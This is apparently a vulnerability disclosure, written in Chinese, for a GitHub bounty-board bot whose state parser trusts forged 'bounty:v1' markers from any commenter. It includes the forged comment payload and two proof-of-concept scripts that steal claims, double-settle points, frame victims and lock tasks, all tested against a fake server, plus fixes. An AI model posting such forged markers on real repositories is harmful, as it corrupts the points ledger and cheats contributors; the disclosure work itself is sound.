**项目归属（补）**：`project:bounty_site` · **难度自申请（补）**：medium（跨状态机与真模式两条路径、带假服务器复现，但没有附补丁和变异自证；若补上参考补丁＋变异可按 hard 申请；最终定档以维护者为准）
**影响等级建议（补）**：S（任何 GitHub 用户发一条评论就能改写权威状态并触发结算，默认配置即可触发；账本 append-only，错记的分撤不回。按《价值评价规格 v0.1》§四「不做会怎样」判）
**意图（补）**：让维护者知道：权威记录目前不校验作者，任何人都能伪造 bounty:v1 标记改状态、改分。

**基线**：`1e75766`（审计基准，2026-10-11）· 当前 HEAD `af41c07` 上仍复现 · Python 3.14.3 / Windows 11（原审计 Python 3.12 / Linux）· 纯标准库；只读导入 `scripts/bounty_board.py`，GitHub 侧用 127.0.0.1 假服务器，`apply=False`，全程未对真实 GitHub 发出任何写请求

## 现象
模块文档写明「issue 线程本身就是状态存储，标记评论是权威记录」。但这份权威记录是**向所有人可写**的：重建状态时只看评论正文，不看作者。任何能在该 issue 下评论的人（不需要是协作者）发一条

```
<!-- bounty:v1 {"state": "settled", "holder": "mallory", "seq": 999} -->
```

只要 `seq` 不小于机器人当前标记的 seq，这条评论就会在**之后任何一次**命令或定时扫描重建状态时被当成最新权威记录：`latest_marker()` 对所有正文做 `MARKER_RE.finditer`，不区分作者；`:398` 还用 `>=` 比较 seq，同号时后出现者胜。这条评论本身不会被当命令执行（路由见到标记就按「机器人自身留言」跳过），但它一直留在线程里——跳过的是「当命令执行」，不是「当权威记录」。

## 实测读数
纯逻辑七个场景（`repro/rA-statemachine/a1_forged_marker.py`，本机实跑）：

```
== 场景 a：抢夺持有者（alice 合法认领，mallory 伪造标记后由 mallory 交付）
 alice /claim   : 通过 open->claimed holder=alice rounds=0 delta=0 | @alice 认领，锁至 2026-10-12T01:00:00Z
 伪造后重建态   : state=claimed holder=mallory seq=99
 mallory /deliver: 通过 claimed->delivered holder=mallory rounds=1 delta=0 | @mallory 第 1 轮交付（https://github.com/x/y/pull/1）
 alice /deliver  : 拒绝 delivered->delivered holder=mallory rounds=1 delta=0 | 仅当前持有者可执行该命令（当前持有者：@mallory）
== 场景 b：跳过第④闸人审（伪造 verified 态，维护者 /settle 直接入账）
 maintainer /settle: 通过 verified->settled holder=mallory rounds=1 delta=20 | 结算 20 分（expert（base 10））
 账本中是否有任何 verify 事件: False
== 场景 c：重复结算（真实结算后再伪造 verified，第二次 /settle 再记一次分）
 第1次: 通过 verified->settled holder=alice rounds=1 delta=6 | 结算 6 分（medium（base 3））
 第2次: 通过 verified->settled holder=alice rounds=1 delta=6 | 结算 6 分（medium（base 3））
 同一 issue settle 总分 = 12
== 场景 d：嫁祸超时扣分（bob 合法认领中；mallory 伪造 holder=victim 且已过期，sweep 记 victim −2base）
 sweep: 通过 claimed->open holder=None rounds=0 delta=-20 | @victim 认领超时未交付，自动回板 | 扣分归属 event.holder = victim
== 场景 e：同 seq 也能覆盖（latest_marker 用 >=，后出现者胜）
 机器人 seq=1，伪造同 seq 后 state=settled holder=mallory
== 场景 f：招标模式伪造投标人名单，定标时给马甲记落选分
 select: 通过 contest->delivered holder=mallory rounds=1 delta=0 | 定标：@mallory 中标（4 份投标）
 落选事件: [('sock1', 4), ('sock2', 4), ('sock3', 4)]
== 场景 g：永久锁死（伪造 claimed + 不可解析 due_at，sweep 永不回收，任何人无法认领）
 sweep(100 年后) 条数 = 0
 carol /claim: 拒绝 claimed->claimed holder=ghost rounds=0 delta=0 | 已有持有者 @ghost（到期 never）——先等其交付或超时回板
场景命中: [True, True, True, True, True, True, True]
VERDICT=BUG
```

真模式路径（`handle_issue_comment` + `GitHubClient` 指向本地假服务器，只打印计划）：

```
GitHubClient.comments(101) 返回类型: ['str', 'str'] （只有正文，无作者）
命令 `/deliver` · 触发者 @mallory · 维护者=False · 并发认领=0 · 当前态 bounty:claimed
PLAN  #101 claimed → delivered ｜ @mallory 第 1 轮交付（https://e.com/pr/9）
mallory 的 /deliver 被受理: True | 写请求数(apply=False): 0
VERDICT=BUG
```

场景 a–g 依次是：抢走别人已认领的任务、伪造 verified 让维护者 `/settle` 直接入账（账本里没有任何 verify 事件）、同一 issue 重复结算到 12 分（medium 一次过应为 6）、把超时扣分嫁祸给他人（expert −20）、同 seq 覆盖、伪造投标名单发落选分（每人 +4）、伪造 `due_at=never` 永久锁死任务（100 年后 sweep 条数为 0、他人 `/claim` 被拒）。

## 最小复现
依赖：纯标准库。设 `DSH_BOUNTY_REPO` 指向本仓克隆，在各自目录下 `python -X utf8 <脚本>`；两个脚本都不写上游文件、不触网（代理指向死端口）。

### a1_forged_marker.py（纯逻辑七场景）
```python
# -*- coding: utf-8 -*-
"""A1-1：任何人在评论里手写 `<!-- bounty:v1 {...} -->` 即可改写权威状态（latest_marker 不看评论作者）。"""
import json
from _common import bb, Thread, at, CFG, MAINT, show

def forge(**kw):
    return "顺手留个言～\n<!-- bounty:v1 " + json.dumps(kw) + " -->"

bugs = []
print("== 场景 a：抢夺持有者（alice 合法认领，mallory 伪造标记后由 mallory 交付）")
t = Thread()
print(" alice /claim   :", show(t.run("alice", "/claim", at(1))))
t.run("mallory", forge(state="claimed", holder="mallory", due_at="2099-01-01T00:00:00Z", rounds=0, seq=99), at(2))
st = t.state(); print(" 伪造后重建态   : state=%s holder=%s seq=%s" % (st.state, st.holder, st.seq))
d1 = t.run("mallory", "/deliver https://github.com/x/y/pull/1", at(3)); print(" mallory /deliver:", show(d1))
d2 = t.run("alice", "/deliver https://github.com/x/y/pull/2", at(3)); print(" alice /deliver  :", show(d2))
bugs.append(d1.ok and not d2.ok)

print("== 场景 b：跳过第④闸人审（伪造 verified 态，维护者 /settle 直接入账）")
t = Thread(labels=("bounty", "bounty:open", "difficulty:expert"))
t.run("mallory", forge(state="verified", holder="mallory", rounds=1, seq=5), at(1))
d = t.run(MAINT, "/settle", at(2)); print(" maintainer /settle:", show(d))
print(" 账本中是否有任何 verify 事件:", any(e["action"] == "verify" for e in t.ledger))
bugs.append(d.ok and d.event["delta"] == 20 and d.event["holder"] == "mallory")

print("== 场景 c：重复结算（真实结算后再伪造 verified，第二次 /settle 再记一次分）")
t = Thread()
t.run("alice", "/claim", at(1)); t.run("alice", "/deliver https://e.com/pr", at(2))
t.run(MAINT, "/verify pass ok", at(3)); s1 = t.run(MAINT, "/settle", at(4))
seq = t.state().seq
t.run("alice", forge(state="verified", holder="alice", rounds=1, seq=seq + 1), at(5))
s2 = t.run(MAINT, "/settle", at(6))
tot = sum(e["delta"] for e in t.ledger if e["action"] == "settle")
print(" 第1次:", show(s1)); print(" 第2次:", show(s2)); print(" 同一 issue settle 总分 =", tot)
bugs.append(s2.ok and tot == 12)

print("== 场景 d：嫁祸超时扣分（bob 合法认领中；mallory 伪造 holder=victim 且已过期，sweep 记 victim −2base）")
t = Thread(labels=("bounty", "bounty:open", "difficulty:expert"))
t.run("bob", "/claim", at(1))
t.run("mallory", forge(state="claimed", holder="victim", due_at="2000-01-01T00:00:00Z", rounds=0, seq=50), at(2))
ds = bb.sweep([t.state()], at(3), CFG)
for d in ds:
    print(" sweep:", show(d), "| 扣分归属 event.holder =", d.event["holder"])
bugs.append(bool(ds) and ds[0].event["holder"] == "victim" and ds[0].event["delta"] == -20)

print("== 场景 e：同 seq 也能覆盖（latest_marker 用 >=，后出现者胜）")
t = Thread(); t.run("alice", "/claim", at(1)); real = t.state().seq
t.run("mallory", forge(state="settled", holder="mallory", seq=real), at(2))
st = t.state(); print(" 机器人 seq=%d，伪造同 seq 后 state=%s holder=%s" % (real, st.state, st.holder))
bugs.append(st.state == "settled")

print("== 场景 f：招标模式伪造投标人名单，定标时给马甲记落选分")
t = Thread(labels=("bounty", "bounty:contest", "difficulty:expert"))
t.run("mallory", forge(state="contest", bidders=["mallory", "sock1", "sock2", "sock3"], seq=1), at(1))
d = t.run(MAINT, "/select mallory 方案最好", at(2))
print(" select:", show(d)); print(" 落选事件:", [(e["holder"], e["delta"]) for e in d.extra_events])
bugs.append(d.ok and len(d.extra_events) == 3)

print("== 场景 g：永久锁死（伪造 claimed + 不可解析 due_at，sweep 永不回收，任何人无法认领）")
t = Thread()
t.run("mallory", forge(state="claimed", holder="ghost", due_at="never", seq=1), at(1))
print(" sweep(100 年后) 条数 =", len(bb.sweep([t.state()], at(24 * 365 * 100), CFG)))
d = t.run("carol", "/claim", at(2)); print(" carol /claim:", show(d))
bugs.append((not d.ok) and len(bb.sweep([t.state()], at(24 * 365 * 100), CFG)) == 0)

print("场景命中:", bugs)
print("VERDICT=BUG" if all(bugs) else "VERDICT=OK")
```

### a1_forged_marker_live.py（真模式路径 + 假 GitHub）
```python
# -*- coding: utf-8 -*-
"""A1-1（真模式路径佐证）：handle_issue_comment + GitHubClient 对本地假服务器，apply=False（只打印计划）。
证明 GitHubClient.comments() 丢弃了评论作者，非机器人用户写的标记被当作权威记录。"""
import json, io, contextlib
from _common import bb, CFG
from _fakegh import FakeGH, event

gh = FakeGH()
L = ["bounty", "bounty:claimed", "difficulty:hard"]
gh.add_issue(101, L)
cl = bb.GitHubClient("FuRongJun-1999/dsh-bounty", "dummy-token", api_base=gh.base)
# 机器人的合法认领标记（alice 持有）
gh.add_comment(101, "github-actions[bot]", "**[悬赏板] 认领成功**\n<!-- bounty:v1 " + json.dumps(
    {"state": "claimed", "holder": "alice", "due_at": "2099-01-01T00:00:00Z", "rounds": 0, "seq": 1}) + " -->")
# mallory（非机器人、非协作者）伪造的标记
gh.add_comment(101, "mallory", "+1\n<!-- bounty:v1 " + json.dumps(
    {"state": "claimed", "holder": "mallory", "due_at": "2099-01-01T00:00:00Z", "rounds": 0, "seq": 2}) + " -->")
print("GitHubClient.comments(101) 返回类型:", [type(x).__name__ for x in cl.comments(101)], "（只有正文，无作者）")
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    code, evs = bb.handle_issue_comment(event(101, L, "mallory", "/deliver https://e.com/pr/9"), CFG, cl, apply=False)
out = buf.getvalue(); print(out.strip())
ok = code == 0 and evs and evs[0]["action"] == "deliver" and evs[0]["holder"] == "mallory"
print("mallory 的 /deliver 被受理:", bool(ok), "| 写请求数(apply=False):", len(gh.writes))
gh.stop()
print("VERDICT=BUG" if ok else "VERDICT=OK")
```

## 代码定位
```
scripts/bounty_board.py:1170-1181
    def comments(self, n):
        out = []
        for page in range(1, 11):
            chunk = self._req(
                "GET", f"/repos/{self.repo}/issues/{int(n)}/comments"
                       f"?per_page=100&page={page}")
            if not chunk:
                break
            out += [c.get("body") or "" for c in chunk]
            if len(chunk) < 100:
                break
        return out

scripts/bounty_board.py:388-401
def latest_marker(comments):
    """评论流 → 最新的状态标记（权威记录）；无则 None。"""
    best = None
    for body in comments or ():
        for m in MARKER_RE.finditer(body or ""):
            try:
                rec = json.loads(m.group(1))
            except ValueError:
                continue
            if isinstance(rec, dict) and rec.get("state"):
                if best is None or _seq(rec) >= _seq(best):
                    best = rec
    return best


scripts/bounty_board.py:404-420
def build_state(number, labels, comments, author=None) -> IssueState:
    """「标签视图 ＋ 评论流」→ IssueState（态优先级：标记 > 标签 > 默认 open）。"""
    labels = tuple(labels or ())
    marker = latest_marker(comments) or {}
    label_state = next((lbl.split(":", 1)[1] for lbl in labels if lbl in STATE_LABELS), "")
    has_bounty = LABEL_GATE in labels
    state = marker.get("state") or label_state or ("open" if has_bounty else "")
    difficulty = next((lbl for lbl in labels if lbl.startswith("difficulty:")), "")
    return IssueState(
        number=int(number), labels=labels, has_bounty=has_bounty, state=state or "",
        holder=marker.get("holder") or None, due_at=marker.get("due_at") or None,
        rounds=int(marker.get("rounds") or 0), seq=_seq(marker),
        difficulty=difficulty, author=author,
        criteria=tuple(marker.get("criteria") or ()),
        bidders=tuple(marker.get("bidders") or ()),
        impact=marker.get("impact") or "")


scripts/bounty_board.py:1570-1575
    if MARKER_RE.search(body):
        out("本评论是悬赏板自身留言（含 bounty:v1 标记）→ 无动作")
        return 0, []
    cmd, cmd_payload = parse_command(body)
    if not cmd:
        out("非命令评论（命令须在行首最前）→ 无动作")
```

## 影响
- 抢走他人正在做的任务（a）；被抢者的合法 `/deliver` 反被拒。
- 绕过第 ④ 闸人审：伪造 `verified` 后维护者一次 `/settle` 即入账，账本里没有任何 verify 事件（b）。
- 同一任务重复结算，`settle` 总分被刷到应有值的 2 倍（c）。
- 嫁祸超时扣分：`event.holder` 被写成受害者，expert 一次 −20（d）。
- 招标模式下给任意名单发落选分（f，expert 每人 +4）。
- 永久锁死任务：`due_at` 伪造成远期后 sweep 永不回收，任务再也无法被人认领（g）。
- 附带：伪造 `criteria` 时 `quality_delta` 会夹到 [0,1] 而 `rescore` 不夹，合法流程产出的事件也会对账失败。

## 修法
1. `GitHubClient.comments()` 返回 `(login, body)`；`latest_marker()` 只接受机器人账号（`github-actions[bot]`，或按环境变量配置的 bot 登录名）写的标记，其余正文不作权威记录。
2. seq 改为严格 `>`，并校验「新标记 seq = 上一条 + 1」；跳号或重复时 fail-closed 并回评告警。
3. `build_state()` 对标记做 schema 校验（类型/值域），畸形标记不得进入状态。
4. `tests/test_bounty_board.py` 补「非 bot 作者的标记被忽略」守卫，配一条把作者过滤删掉就转红的定点变异。

## 与已有 issue 的关系
本仓现有 #2–#11 全部是对其他仓库（dsh-memory / lingshu）的交付与验收申请。在 `evidence/r0-baseline/bodies.txt`（#2–#11 正文与评论 1394 行）里 grep `bounty:v1`、`latest_marker`、`伪造`、`seq`、`comments(`，命中为 0。

需要点名的是**已关闭的文档 PR #1**（`docs(spec): 悬赏站设计文档 v1.0 与使用指南 v1.0`，作者 ybyz2）：它的对照表里写过「数据库（**修正了「客户端可写权威记录」的信任模型缺陷**）」。也就是说，**信任模型缺陷在设计层面已被点名**——当时是作为另一套平台设计的说辞，并没有作为本仓实现的缺陷提出，也没有落到「谁都能写」「seq 用 `>=` 比较」「跳过执行不等于跳过读取」这些可复现的判据上。本条是该缺陷在现有实现上的具体化与实测读数。

另：PR #1 的审查评论与 review 均为 0 条，全站搜索 `forged marker` 在本组织内只命中本条。

## 在当前 HEAD 上复跑（补，2026-10-12）

被测提交：`af41c07`（dsh-bounty main 最新，2026-10-12 拉取）· Debian 13 / Linux 6.12 · Python 3.12.15 · 纯标准库 · 用 `git archive` 导出到临时目录，`DSH_BOUNTY_REPO` 指向它；脚本只写 /tmp、不触网。
说明：`1e75766`→`af41c07` 之间 `scripts/` 只改了 `build_site.py`（规则页文案），`scripts/bounty_board.py` 未变。

`python -B -X utf8 a1_forged_marker.py`：

```
== 场景 a：抢夺持有者（alice 合法认领，mallory 伪造标记后由 mallory 交付）
 alice /claim   : 通过 open->claimed holder=alice rounds=0 delta=0 | @alice 认领，锁至 2026-10-12T01:00:00Z
 伪造后重建态   : state=claimed holder=mallory seq=99
 mallory /deliver: 通过 claimed->delivered holder=mallory rounds=1 delta=0 | @mallory 第 1 轮交付（https://github.com/x/y/pull/1）
 alice /deliver  : 拒绝 delivered->delivered holder=mallory rounds=1 delta=0 | 仅当前持有者可执行该命令（当前持有者：@mallory）
== 场景 b：跳过第④闸人审（伪造 verified 态，维护者 /settle 直接入账）
 maintainer /settle: 通过 verified->settled holder=mallory rounds=1 delta=20 | 结算 20 分（expert（base 10））
 账本中是否有任何 verify 事件: False
== 场景 c：重复结算（真实结算后再伪造 verified，第二次 /settle 再记一次分）
 第1次: 通过 verified->settled holder=alice rounds=1 delta=6 | 结算 6 分（medium（base 3））
 第2次: 通过 verified->settled holder=alice rounds=1 delta=6 | 结算 6 分（medium（base 3））
 同一 issue settle 总分 = 12
== 场景 d：嫁祸超时扣分（bob 合法认领中；mallory 伪造 holder=victim 且已过期，sweep 记 victim −2base）
 sweep: 通过 claimed->open holder=None rounds=0 delta=-20 | @victim 认领超时未交付，自动回板 | 扣分归属 event.holder = victim
== 场景 e：同 seq 也能覆盖（latest_marker 用 >=，后出现者胜）
 机器人 seq=1，伪造同 seq 后 state=settled holder=mallory
== 场景 f：招标模式伪造投标人名单，定标时给马甲记落选分
 select: 通过 contest->delivered holder=mallory rounds=1 delta=0 | 定标：@mallory 中标（4 份投标）
 落选事件: [('sock1', 4), ('sock2', 4), ('sock3', 4)]
== 场景 g：永久锁死（伪造 claimed + 不可解析 due_at，sweep 永不回收，任何人无法认领）
 sweep(100 年后) 条数 = 0
 carol /claim: 拒绝 claimed->claimed holder=ghost rounds=0 delta=0 | 已有持有者 @ghost（到期 never）——先等其交付或超时回板
场景命中: [True, True, True, True, True, True, True]
VERDICT=BUG
```
与正文 Windows 读数逐行比对：本次 24 行输出全部能在正文代码块里找到同样的行。

`python -B -X utf8 a1_forged_marker_live.py`：

```
GitHubClient.comments(101) 返回类型: ['str', 'str'] （只有正文，无作者）
命令 `/deliver` · 触发者 @mallory · 维护者=False · 并发认领=0 · 当前态 bounty:claimed
PLAN  #101 claimed → delivered ｜ @mallory 第 1 轮交付（https://e.com/pr/9）
mallory 的 /deliver 被受理: True | 写请求数(apply=False): 0
VERDICT=BUG
```
与正文 Windows 读数逐行比对：本次 5 行输出全部能在正文代码块里找到同样的行。

## 预期结果（补）

修复后，维护者用同一脚本复跑应看到：

- 非机器人账号写的 `bounty:v1` 标记一律不被 `latest_marker()` 采信：`a1_forged_marker.py` 的 7 个场景全部不再命中（抢持有者、跳过人审结算、重复结算、嫁祸扣分等均被拒或忽略）
- `a1_forged_marker_live.py` 真模式路径同样不受理伪造标记
- 两个脚本末行都打印 `VERDICT=OK`

## 守卫与定点变异（补，验收判据，尚未实测）

本条只报缺陷、没有附补丁，所以**还没有**修前红 / 修后绿的读数。建议按这两步验收：
1. 把上面的复现脚本改写成守卫：在当前 HEAD 上必须红（上一节已经是红），修复后必须绿；
2. 定点变异：在修复上把关键的那一处改回原样（正文「修法」里提到的那行），守卫必须转红并点名对应断言，还原后转绿。

## 可信边界（补）

**已验**：原审计 `1e75766`（Linux，Python 3.12）；作者本机 `af41c07`（Windows 11，Python 3.14.3）；本次 `af41c07`（Linux，Python 3.12.15）——三处末行都是 `VERDICT=BUG`。
**未验**：没有在真实 GitHub 仓库和真实 Actions 上跑（GitHub 侧用的是假服务器 / 桩客户端 / 纯逻辑层）；没有写补丁，所以修法没有经过测试；没有跑上游 `tests/test_bounty_board.py` 全量。
**不确定**：影响等级和难度是自评，以维护者定档为准。
